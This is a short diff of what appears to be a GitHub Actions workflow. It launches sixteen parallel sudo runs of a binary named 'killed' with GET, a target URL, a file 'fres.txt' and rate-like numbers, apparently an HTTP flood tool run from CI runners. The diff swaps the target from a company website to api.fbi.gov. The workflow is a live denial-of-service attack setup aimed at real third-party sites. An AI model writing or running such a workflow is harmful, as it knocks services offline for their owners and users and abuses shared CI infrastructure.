@@ -19,7 +19,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..16}; do
-            sudo timeout 35 ./killed GET https://www.dgnteknoloji.com/kurumsal fres.txt 35 950 8 &
+            sudo timeout 35 ./killed GET https://api.fbi.gov/ fres.txt 35 950 8 &
             PIDS+=($!)
           done
           
